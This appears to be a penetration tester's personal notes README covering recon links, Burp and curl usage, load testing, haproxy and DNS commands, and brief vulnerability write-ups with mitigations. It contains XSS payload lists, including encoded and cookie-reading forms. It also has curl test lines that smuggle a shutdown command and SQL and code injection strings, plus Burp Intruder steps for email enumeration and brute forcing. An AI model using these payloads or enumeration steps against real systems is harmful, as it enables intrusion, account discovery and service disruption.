# AppSec Dumping Ground

Over time you collect lots of small, useful tips.  Below is my attempt to write some of them down.

<!-- TOC -->

- [AppSec Dumping Ground](#appsec-dumping-ground)
    - [Reconnaissance](#reconnaissance)
        - [Exposed passwords](#exposed-passwords)
        - [Domain / Port issues](#domain--port-issues)
        - [Domain names](#domain-names)
        - [fast scanning on large number of hosts](#fast-scanning-on-large-number-of-hosts)
        - [Print Server's Certificate Chain](#print-servers-certificate-chain)
    - [Proxy traffic](#proxy-traffic)
        - [macOS env variable](#macos-env-variable)
        - [Jetbrains IDE](#jetbrains-ide)
        - [macOS Desktop apps](#macos-desktop-apps)
        - [Proxy OpenSSL](#proxy-openssl)
        - [Invisble proxying](#invisble-proxying)
        - [Add debug logging, as alternative to proxying](#add-debug-logging-as-alternative-to-proxying)
    - [Shell tricks](#shell-tricks)
        - [Trick in Container with no Vi / nano](#trick-in-container-with-no-vi--nano)
        - [Operators](#operators)
        - [diff between files](#diff-between-files)
        - [grep](#grep)
    - [Burp](#burp)
        - [Search Burp files](#search-burp-files)
        - [Replay requests](#replay-requests)
            - [Same requests many times](#same-requests-many-times)
        - [Replay requests turbo](#replay-requests-turbo)
        - [Enumeration](#enumeration)
            - [Find API](#find-api)
            - [Response](#response)
            - [Burp Intruder - Username Generator](#burp-intruder---username-generator)
            - [Burp Intruder - Brute Forcer](#burp-intruder---brute-forcer)
        - [Inject XSS Payload](#inject-xss-payload)
            - [Request](#request)
            - [Burp Extender](#burp-extender)
            - [Burp Intruder set up](#burp-intruder-set-up)
    - [JMeter](#jmeter)
        - [Set a replayed request](#set-a-replayed-request)
        - [Summary Report](#summary-report)
        - [Send Parallel requests](#send-parallel-requests)
    - [cURL](#curl)
    - [Apache Bench](#apache-bench)
        - [load test a container](#load-test-a-container)
            - [Verbose flag to verify HTTP response code](#verbose-flag-to-verify-http-response-code)
    - [haproxy](#haproxy)
        - [Install](#install)
        - [Run](#run)
        - [Validate config file](#validate-config-file)
        - [Example Proxy Pass all data](#example-proxy-pass-all-data)
        - [Example remove Cookies and add header](#example-remove-cookies-and-add-header)
        - [Replace user-agent](#replace-user-agent)
            - [More HAProxy commands](#more-haproxy-commands)
            - [Local Echo Server](#local-echo-server)
    - [DNS](#dns)
    - [Homebrew](#homebrew)
        - [Brew](#brew)
    - [Vulnerabilities](#vulnerabilities)
        - [Bug Bounty reports](#bug-bounty-reports)
        - [Loose Cookie attributes](#loose-cookie-attributes)
            - [Mitigation](#mitigation)
        - [Subdomain Takeovers](#subdomain-takeovers)
        - [XSS Payloads - Stored XSS](#xss-payloads---stored-xss)
            - [Mitigation](#mitigation)
            - [Simple XSS Payloads](#simple-xss-payloads)
        - [Use encoded colon XSS Payloads](#use-encoded-colon-xss-payloads)
        - [Phishing](#phishing)
            - [Mitigation](#mitigation)
        - [Billion Laughs Attack](#billion-laughs-attack)
            - [Background](#background)
            - [Simulating the attack](#simulating-the-attack)
            - [Sample code](#sample-code)
            - [Mitigations](#mitigations)

<!-- /TOC -->

## Reconnaissance

### Exposed passwords

<https://intelx.io/>

### Domain / Port issues

<https://spyse.com/>

### Domain names

Interesting way to see whether a company has bought some TLDs or domains you didn't expect.  <https://rapidapi.com/domainr/>.

[Documentation](https://domainr.com/docs/api)

### fast scanning on large number of hosts

<https://github.com/projectdiscovery/nuclei>

### Print Server's Certificate Chain

`echo | openssl s_client -showcerts -connect foobar.com :443 2>/dev/null | openssl x509 -inform pem -noout -text`

## Proxy traffic

### macOS env variable

on `macOS`, it is simpler to proxy command line apps - such as Homebrew, Rust, Python, C - using an environment variable:

```bash
export https_proxy=127.0.0.1:8081

# Test it:
curl https://ifconfig.io

unset https_proxy
```

### Jetbrains IDE

For compiled languages, it is easier to produce a compiled binary and then proxy it via JetBrains IDE.  For example:

```bash
export https_proxy=127.0.0.1:8081
./target/debug/playground
// traffic will appear in Burp
```

### macOS Desktop apps

With Safari or Slack, you have to change the macOS `Network Proxy` settings.

### Proxy OpenSSL

No `invisible proxy` is required to read OpenSSL traffic if you use the `proxy` flag.

```bash
# original
curl https://httpbin.org/ip

# proxied
curl -x, --proxy 127.0.0.1:8080 https://httpbin.org/ip

# proxied
openssl s_client -connect httpbin.org:443 -proxy 127.0.0.1:8081
```

### Invisble proxying

For proxy unaware clients via Burp on macOS.

```bash
echo "[*]Invisible proxy script starting..";

get_forwarding_status () {
    forwarding_status="$(sysctl net.inet.ip.forwarding)"
    if [ "${forwarding_status: -1}" -eq 1 ]; then
        echo "Forwarding already on"
    else
        sudo sysctl -w net.inet.ip.forwarding=1
        echo "Turned on forwarding"
    fi
    unset forwarding_status
}

set_port_forwarding_rules () {
    sudo pfctl -s nat &> ~/fifo.txt

    if grep -q '80 -> 127.0.0.1 port 8080' ~/fifo.txt && grep -q '443 -> 127.0.0.1 port 8080' ~/fifo.txt; then
        echo "-> Port Forwarding rules already on"
    else
        echo "rdr pass inet proto tcp from any to any port { 80 443 } -> 127.0.0.1 port 8080" | sudo pfctl -ef -
        echo "Port Forwarding rules added"
    fi
    echo "[*]Removing temporary file";
    if rm ~/fifo.txt ; then echo "Removed fifo.txt" ; fi
}

while getopts ": aAcC" opt; do
case $opt in
        [aA])
            echo "[*]CHECK FOR KERNAL FORWARDING";
            get_forwarding_status;
            set_port_forwarding_rules;
            echo "[*]SCRIPT COMPLETE";
        exit 0;;

    [cC]) echo "[*]CLEAN_UP";
            sudo pfctl -F all -f /etc/pf.conf;
            sudo sysctl -w net.inet.ip.forwarding=0;
            echo "[*]SCRIPT COMPLETE";
        exit 0;;

    \?) echo "[!]Invalid option: -$OPTARG" >&2;exit 0;;
esac
done
echo "[!]Enter [-a] add [-c] clean Proxy Rules";
```

### Add debug logging, as alternative to proxying

Some AWS libraries can be debugged by setting an environment variable to print network requests. For example:

`RUST_LOG=debug my_rust_app`

Or:

`RUST_LOG=rusoto,hyper=debug`

## Shell tricks

### Trick in Container with no Vi / nano

```shell
# get from Paste into script
cat > myscript.sh
```

### Operators

```shell
# run A then B, regardless of A's success
"A ; B"   
# run B if A succeeded
"A && B"  
# run B if A failed
"A || B"
# run A in background
"A &" 
# test return code
terraform fmt -check ; test $? -eq 0 

# check for empty strings
test -n "yest" ; echo $?
0
test -n "" ; echo $?    
1
test -n  ; echo $?  
0
test -n $CIRCLE_PULL_REQUEST ; echo $?
0
test -n "$CIRCLE_PULL_REQUEST" ; echo $?
1
```

### diff between files

```shell
cat file1 && echo "\n" && cat file2
a
b
c
d
e


d
e
f
g

# get lines not that are not in each file
▶ cat file1 file2 | sort | uniq -u   
a
b
c
f
g

#find lines only in file1
comm -23 file1 file2 
a
b
c

#find lines only in file2
comm -13 file1 file2 
f
g

#find lines in both files
comm -12 file1 file2 
d
e

# cuts from a forward slash
 - cat file.txt | cut -d "/" -f3-
```

### grep

```shell
# grep OR and case insensitive
cat some_file | grep -i 'nz\|au'

# count lines ( important to sort first)
cat ip_deny.tf | grep "ip =" |sort | uniq -c
2       ip = "192.168.0.1"
1       ip = "192.168.0.2"
1       ip = "192.168.0.3"
```

## Burp

### Search Burp files

```bash
grep --include=\*.burp -rnw . -e "hotel"


# -r recursive
# -n line number
# -w match whole word
```

### Replay requests

#### Same requests many times

You can do this with Intruder ( not Repeater, as you might expect ).  

- Send request to `Intruder`
- In `Positions` tab, `Clear §`
- In `Payloads` tab, select:
  - `Payload Type: Null Payment`
  - Select number of requests to replay

### Replay requests (turbo)

`Turbo Intruder` is a `Burp Suite extension` for sending large numbers of HTTP requests when you require extreme speed.

The author of this extender said:

> it's designed for sending lots of requests to a single host. If you want to send a single request to a lot of hosts, I recommend ZGrab.

### Enumeration

#### Find API

```json
POST /check-account
Host: foobar.com

{"email":"foo.bar@foobar.com"}
```

#### Response

```json
{"registered":false}
```

#### Burp Intruder - Username Generator

- Send request to `Intruder`
- In `Positions` tab, select `Clear §`
- Then select `Add §` after highlighting `"foo.bar@foobar.com"`
- In `Payloads` tab, select:
  - `Payload Type: Username Generator`
  - `Payload Options [Username Generator]` add base target email `foo_bar@foobar.com`
  - `Payload Encoding` de-select the `URL encode` box
- In `Options` tab, select:
  - de-select _"make unmodified baseline request"_
  - In `Attack Results` specify whether to save requests and responses
  - In `grep match` add the line `"registered":true` [ to ensure it is simple to view a successful attack ]

#### Burp Intruder - Brute Forcer

- < same as above steps>
- In `Payloads` tab, select:
- `Payload Type: Brute Forcer`
  - Select the `Character Set`
  - Select the `min length` and `max length`
  
> You can slow the enumeration attempt to avoid `Rate Limits` by adding a custom `Resource Pool` inside of `Intruder`.  You can delay the time between requests.

### Inject XSS Payload

#### Request

```json
POST /v1/final-order HTTP/1.1
Host: foobar.com

{"address":"125 important place"}
```

#### Burp Extender

From `Extender` select `BApp Store`. Install `xssValidator`.

#### Burp Intruder set up

- Send request to `Intruder`
- In `Positions` tab, select `Clear §`
- Then select `Add §` after highlighting `"125 important place"`
- In `Payloads` tab, select:
  - `Payload Type: Extension-generated`
  - `Payload Options [Extension-generated]` select `XSS Validator Payloads`
- In `Options` tab, select:
  - de-select _"make unmodified baseline request"_
  - `Grep – Match section`, and enter the string expected.

## JMeter

### Set a replayed request

`Copy as cURL` from within Firefox Web Developer.

Select:

- `/Tools/Import from cURL`.
- `Add cookie header to Cookie Manager`.
- Create Test Plan

Test 1: 5000 requests

Set the `Thread Group`:

- Number of Threads (users): `${__P(threads,10)}`
- Ramp-up period (seconds): `${__P(rampup,1)}`
- Loop Count: `10`

Right click on `Thread Group` and select `Add Think Time to Children`.

Select `HTTP Request` and set the `Use KeepAlive`.

Then adjust the `Think Time` as required.

Right click on `Thread Group` and select `Validate`.

To view results and server responses select `View Results Tree`.

### Summary Report

`Thread Group / Add / Listener / Summary Report`

### Send Parallel requests

If you want to exhaust a service, parallel requests use a new HTTP client for each request ( which is different from Concurrent requests which uses a single HTTP client).

Import the cURL request (`/Tools/Import from cURL` )

Right click on the imported `HTTP Request`:

- `Add/Listener/View Results in Table`
- `Add/Time/Synchronizing Timer`

On `Synchronizing Timer`, select `Number of Simulated Users to Group by: 10`

Then go to `"View Results by Table"`.  Select Play.

Notice 10 requests sent at once.

## cURL

```bash

# simple GET request
curl -i -H "Accept: application/json" -H "Content-Type: application/json" -X GET https://www.google.com/deadbeef

# generate a random cookie string
curl 127.0.0.1:8080 --cookie "CUSTOMER_COOKIE=$(openssl rand -hex 4)"

# POST request [ inferred from --data ] with body in file call payload.json
curl -v -k "$URL" \
  -H 'Content-Type: application/json' \
  --data @payload.json

# environment variables ( double quoted )
curl ${H1_HOSTNAME} -H 'User-Agent: '"${H1_FUZZ_UG}"'' \ 

# get all DockerHub images from a company
curl -s "https://hub.docker.com/v2/repositories/someCompany/?page_size=100" | jq -r '.results|.[]|.name'


# no Cache header
curl -H 'Cache-Control: no-cache, no-store' http://www.example.com

#Silent
curl -s 'http://example.com' > /dev/null

# Test SQL injection
curl -I http://<http_hostname>:<external_port>/\?id\=%27%20OR%20%271

# Test Cross-site scripting
curl -I http://<http_hostname>:<external_port>/\?id\=\<script\>alert\(\1\)\</script\>

# Test command injection
curl -I http://<http_hostname>:<external_port>/\?id\=%3B+%2Fsbin%2Fshutdown

# Test code injection
curl -I http://<http_hostname>:<external_port>/\?id\=phpinfo\(\)

# Trace / debug
curl --trace-ascii - https://example.com

# Perpetual Healthcheck in Docker Image like https://hub.docker.com/r/curlimages/curl
HEALTHCHECK --interval=5m --timeout=3s \
  CMD curl -f http://localhost/ || exit 1

# Get from GitHub
curl -LJO https://github.com/foo/bar/v0.2.1

#Silent but http code
curl --write-out '%{http_code}' --silent --output /dev/null http://example.com

#Watch redirects
curl -v -L ${TARGET_URL_AND_PATH} 2>&1 | egrep "^> (Host:|GET)"

#loop requests
# HEAD
for i in {1..25}; do curl -I https://${HOSTNAME}; done | grep HTTP\n

# GET with zero feedback on progress
for i in {1..50}; do curl -s -H 'Content-type: application/json'  -H $'Secret: Foobar;' https://${HOSTNAME}; done |  > /dev/null 

# POST to a Slack Webhook
curl -X POST -H 'Content-type: application/json' --data '{"text":"Hello, World!"}' ${SLACK_URL}

# GET with a custom Host header
curl -H "Host: ${HOSTNAME}" https://${HOSTNAME}

# POST to a Slack Webhook with a json file
curl -X POST \
        -H 'Content-type: application/json' \
        -d @payload_simple.json  $SLACK_URL

# POST wit Bearer Token ( zero cookies )
curl -X POST \
    -H "Content-Type: application/json" \
    -H $'Accept: application/json' \
    -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15);' \
    -H $'Accept-Language: en' \
    -H ${BEARER} \
    -H $'Connection: close' \
    --data-binary $'{\"foo\":\"json\"}' \
    ${TARGET_URL_AND_PATH}

#Provoke a Block
export H1_HOSTNAME="https://www.hackerone.com" && \
export H1_FUZZ_UG="Fuzz Faster U Fool v1.3.1-dev" && \
curl -I ${H1_HOSTNAME} \
     -H 'X-Requested-With: XMLHttpRequest' \
     -H 'Accept: application/json' \
     -H 'Connection: keep-alive' \
     -H 'User-Agent: '"${H1_FUZZ_UG}"'' \
     -H 'Accept-Encoding: gzip'
```

## Apache Bench

### load test a container

```bash

    -n: Number of requests
    -c: Number of concurrent requests
    -H: Add header
    —r: flag to not exit on socket receive errors
    -k: Use HTTP KeepAlive feature
    -p: File containing data to POST
    -X proxy:port   Proxyserver and port number to use
    -T: Content-type header to use for POST/PUT data,


#GET with Header
ab -n 100 -c 10 -H "Accept-Encoding: gzip, deflate" -rk ${TARGET_URL_AND_PATH}

#POST locally
ab -n 100 -c 10 -p data.json -rk ${TARGET_URL_AND_PATH}

#POST with 5 second timeout ( default is 30 seconds )
ab -n 1 -c 1 -s 5 -p payload.json -T application/json -rk ${TARGET_URL_AND_PATH}

#Write AB results to file. Count successful requests
ab -n 1000 -c 10 -C 'Cookie: foobar=1' -v 2 -r ${TARGET_URL_AND_PATH} > results.txt 2>&1
cat results.txt| grep "HTTP/"
cat results.txt| grep -c "200 OK"

#POST proxy request ( as env variable does not work)
ab -n 1 -c 1 -p payload.json -T application/json -rk -X 127.0.0.1:8081 ${TARGET_URL_AND_PATH}

#GET request with Cookies and debug via a Proxy
ab \
	-n 3 \
    -c 2 \
 	-C 'Cookie: foo=123;bar=345' \
    -rk -X 127.0.0.1:8081 \
    ${TARGET_URL_AND_PATH}

```

#### Verbose flag to verify HTTP response code

```bash
export BEARER="Authorization:Bearer xxxxxxx"
export TARGET_URL_AND_PATH="https://httpbin.org/post"

# --verbose 2 gives you a HTTP response code
# --verbose 4 gives all cert details of server

ab \
        -v 2 \
        -n 1 \
        -c 1 \
        -p payload.json \
        -T application/json \
        -H $'device-guid: aaaaa' \
        -H ${BEARER} \
        -rk \
        ${TARGET_URL_AND_PATH}

```

## haproxy

### Install

```bash
brew install haproxy
brew info haproxy
haproxy -v
brew deps --tree haproxy
brew options haproxy
```

### Run

```bash
brew services start haproxy
brew services stop haproxy


# verbose
sudo haproxy -f haproxy.cfg -V

# silent
sudo haproxy -f haproxy.cfg
```

### Validate config file

`haproxy -c -f haproxy.cfg`

### Example Proxy Pass all data

```js
// haproxy.cfg
// https://www.haproxy.com/blog/haproxy-configuration-basics-load-balance-your-servers/

defaults
  mode http
  timeout client 10s
  timeout connect 5s
  timeout server 10s 
  timeout http-request 10s

frontend myfrontend
  bind 127.0.0.1:8080
  default_backend myservers

backend myservers
  server server1 127.0.0.1:8000
```

### Example remove Cookies and add header

```js
// https://www.haproxy.com/documentation/hapee/latest/traffic-routing/rewrites/rewrite-requests/
defaults
  mode http
  timeout client 10s
  timeout connect 5s
  timeout server 10s
  timeout http-request 10s

frontend myfrontend
  bind 127.0.0.1:8080
  acl h_xff_exists req.hdr(X-Forwarded-For) -m found
  http-request add-header X-Forwarded-For %[src] unless h_xff_exists
  default_backend myservers

backend myservers
  acl at_least_one_cookie req.cook_cnt() gt 0
  http-request del-header Cookie if at_least_one_cookie
  server server1 127.0.0.1:8000

```

### Replace user-agent

```bash
# http://cbonte.github.io/haproxy-dconv/2.0/configuration.html#1.2.2

http-request replace-header User-Agent curl foo

# applied to:
User-Agent: curl/7.47.0

# outputs:
User-Agent: foo
```

#### More HAProxy commands

```bash

# pointless set header to existing header
http-request set-header User-Agent %[req.fhdr(User-Agent)]

# set user-agent to deadbeef
http-request set-header User-Agent deadbeef

### Add the IP address of HAProxy
option forwardfor

# Random number header
http-request add-header X-Random rand(1:100),mul(2),sub(5),add(3),div(2)

# Device info (option is only available when haproxy has been compiled with USE_51DEGREES)
http-request set-header X-DeviceInfo %[51d.all(DeviceType,IsMobile,IsTablet)]
#Please note that this 
```

#### Local Echo Server

```bash
# Echo back request. Includes HTTP Headers
docker run -p 8080:8080 --rm -t mendhak/http-https-echo:21
```

## DNS

```shell
# read local DNS entries. Can be removed on macos in /etc/resolver
scutil --dns

# get the txt records in tidy format
dig txt foobar.com +short

# DNS provider
dig foobar.com  -t ns  +short
mona.ns.cloudflare.com.
phil.ns.cloudflare.com.

# Name server
host -t ns foobar.com     
foobar.com name server mona.ns.cloudflare.com.
foobar.com name server phil.ns.cloudflare.com

# Name server
nslookup foobar.com  

# nslookup interactive interface
▶ nslookup

#Name server               
> set type=ns
> foobar.com

# Email
> set type=mx
> foobar.com 

# Email
> set type=CNAME
> foobar.com

# Pull most info
dig @8.8.8.8  foobar.com -t ANY`

# Identify the I.P. addresses
dig @8.8.8.8  foobar.com +short      
172.67.137.244
104.21.78.229

### Whois
whois foobar.com

Domain Name: foobar.com
Creation Date: 2018-XX-XX
Registry Expiry Date: 2024-XX-XX
Registrar: BadHostProvider
Registrant Organization: foobar LLC

```

## Homebrew

### Brew

```shell
# Search for packages
brew search tree

# install Tree
brew install tree

# avoid installing macOS tools by visiting websites
brew install burp-suite --cask

# Stop brew trying to update with every package install
export HOMEBREW_NO_AUTO_UPDATE=1

# Check which tools inside a Tap are installed
brew search foo/tools

# list taps installed
brew tap
brew tap heroku/brew

# remove a Tap
brew untap foo/tools

# install Tap
brew tap foo/tools git@github.com:foo/tools.git

# install Package from a Tap ( inside a Private Github repo )
brew install foo/tools/some-cli
brew install --interactive foo/tools/some-cli

# uninstall Package inside a Tap
brew uninstall some-cli

# Verify that things are working ( this will provoke any HTTP404 or Token issues ) 
brew audit --tap=foo/tools --except=version
brew audit foo/tools/some-cli --online --git --skip-style -d

# Edit a formula locally
brew edit foo/tools/some-cli

# check installed versions

brew list --formulae |
xargs brew info --json |
jq -r '
    ["name", "latest", "installed version(s)"],
    (.[] | [ .name, .versions.stable, (.installed[] | .version) ])
    | @tsv
'
```

## Vulnerabilities

### Bug Bounty reports

Bug Bounty reports don't tell to yield the most complex bugs. But you will see:

- Subdomain takeovers
- API keys, tokens inside of apps or in web sites
- Public access to Docker hub images, GitHub repos that should be private
- Misconfigured third party software ( Jira, ServiceNow )
- Public access to debug logs, profilers,crash logs
- Leaked employee credentials
- Third party account takeovers ( instagram, twitter )
- Firewall config issues

### Loose Cookie attributes

When a customer logs into a website, they are given a Cookie - either a `Session Cookie` or a `Persistant Cookie` [ with an expiry time ].  As [OWASP](https://owasp.org/www-community/HttpOnly) state, These cookies have value:

>the majority of XSS attacks target theft of session cookies

If a person selects "Web Developer tools" and `Console` from Firefox or Chrome they can dump cookies via the API `document.cookie`.  This is a "getter" for all Cookies that do NOT have the `HttpOnly` flag set.

#### Mitigation

There can be reasons a `session cookie` may not be protected correctly.  It can be mitigated by setting the `HttpOnly` and `Secure flag` on important cookies.  Ideally, you don't want them accessible on the client and you don't want them sent over HTTP-only.

### Subdomain Takeovers

What happened?  The person may have found a dangling CNAME that points to a site that hosts no content.

You can get off the shelf scripts to find these dangling CNAMEs:

<https://github.com/mandatoryprogrammer/cloudflare_enum>

A great article on the topic from [Mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Subdomain_takeovers)

> Suppose you control the domain example.com. You want to add a blog at blog.example.com, and you decide to use a hosting provider who maintains a blogging platform. The process you go through might look like this:
1.You register the name "blog.example.com" with a domain registrar.
2.You set up DNS records to direct browsers that want to access blog.example.com so that they go to the virtual host.
3.You create a virtual host at the hosting provider.

I like the analogy they give:

> A subdomain is like an electrical outlet. If you remove your appliance from the outlet (or haven’t plugged one in yet), someone can plug in a different one. You must cut power at the breaker or fuse box (DNS) to prevent the outlet from being used by someone else.

### XSS Payloads - Stored XSS

Trying to inject malicious tags into a database using different payloads:

#### Mitigation

1. A Web Application Firewall could screen for the latest OWASP XSS Payloads.

2. Application libraries that would strip out harmful tags.  For example, with Ruby on Rails, you could use the [SanitizeHelper](https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html) Module:

>The SanitizeHelper module provides a set of methods for scrubbing text of undesired HTML elements.

3. The page at risk of an XSS payload may not be __Internet facing__.

4. The page at risk may require additional privileges to access.

#### Simple XSS Payloads

```html
YYY<script>alert('Hello');</script>ZZZ 
"><script>alert('Hello')</script> 
<object data=javascript:alert(3)>
<svg><animate onbegin=alert() attributeName=x></svg>
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<svg/onload=alert(1)><svg>
YYYYY<marquee onstart=alert(1)>ZZZZZ
```

### Use encoded colon XSS Payloads

```html
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
YYYYY<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ZZZZZ
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
```

### Phishing

A sophisicated phishing attempts will often:

- Set up a web site with the hostname close to the target hostname.
- Use the same stylesheets and graphics as the target.  This is all public information.
- Create a `certificate chain` to ensure the site uses `https` and appear secure.

If the attacker has more time, skill and resource, he/she may mimic the old site, in terms of server side language.  For example, using `php` in a site against a company that never writes `php` is a major clue.

#### Mitigation

1. Check the [certificate transparency logs](https://crt.sh) to see who has registered a domain close your own domain name.  For example, `https://crt.sh/?CN=rustymagnet%25&match=ILIKE`.

2. Go to the `Registrar` or the `hosting company` ( often the same company ) and ask for it to be taken offline.  This process can take forever, as there may be many cases in progress.  

3. Call for a [UDRP](https://en.wikipedia.org/wiki/Uniform_Domain-Name_Dispute-Resolution_Policy) if the content of the website is the same content.

4. Check `whois badsite.com`.

```text
Domain name: badsite.com
Creation Date: 2021-06-03
Registrar: NAMECHEAP INC
Registrar Abuse Contact Email: abuse@namecheap.com
Registrant Name: Withheld for Privacy Purposes
Registrant Organization: Privacy service provided by Withheld for Privacy ehf
Registrant Street: street 22
Registrant City: some city
Registrant State/Province: Capital Region
Registrant Postal Code: some zip code
Registrant Country: US
Registrant Phone: some phone number
```

5. Check the leaf certificate of the supicious site for `Subject Alt Names`.  This - like the `certificate transparency logs` give visibility into other potential hostnames from the same attacker that could appear in the near future.

6. User education and comms.

### Billion Laughs Attack

#### Background

A type of `Denial of Service` attack on a server.  A malicious payload could cause XML parsing code to choke, unless it was handled.  

This attack is useful, even if it does not disrupt the server.  The attack can still `disclose information` about a target application.  For example, if you send the malicious payload into a Ruby application, it will throw an `exception`.  Depending on how the server is setup, this could return a `stack trace`:

Based on the output:

```html
<h1>
 RuntimeError
</h1>
<pre>entity expansion has grown too large</pre>
```

The stack trace may look intimidating.  However, if you look at a `Ruby` stack trace it is split into three sections:

```ruby
Application-Trace
Framework-Trace
Full-Trace
```

Based on where the `Framework-Trace` stopped, you can see the `exception` is raised from `rexml/text.rb` You can even find the code that raised the `exception` [here](https://github.com/ruby/rexml/blob/master/lib/rexml/text.rb).

If you get a `stack trace`, it could reveal details on the application version, libraries used and internal details.

#### Simulating the attack

This can even happen when a request to a server had a different content type. For example:

The original request header:

| Request      | content-type |
| ----------- | ----------- |
| Original      | application/json; charset=utf-8       |
| Modified   | text/xml        |

Not all parsing libraries are equal.  

Python has some libraries that vulnerable to the `Billion Laughs Attack`.  Vulnerable libraries [here](https://docs.python.org/3/library/xml.html#xml-vulnerabilities).

#### Sample code

```python
import xml.etree.ElementTree as ET

if __name__ == '__main__':
    root = ET.parse('harmless.xml').getroot()
    print(root)

    for elem in root:
        print('{0}'.format(elem.attrib['name']))
        for e in elem:
            print('\t\t{0}\t{1}'.format(e.tag, e.text))
```

This code times out, when you point it to the `malicious_payload.xml`, as it gets caught by `xml.etree.ElementTree`.

#### Mitigations

- Turn off entity expansion.
- Limit the number of Entity Reference Nodes that the parser can expand.
- Limit the number of characters entities can expand to.

[Ruby](https://github.com/ruby/rexml/blob/master/lib/rexml/text.rb)

[General](https://cytinus.wordpress.com/2011/07/26/37/#:~:text=Explanation%3A,an%20entity%20can%20expand%20to.&text=The%20Entity%20Expansion%20Limit%20does%20not%20protect%20against%20external%20entity%20attacks.)
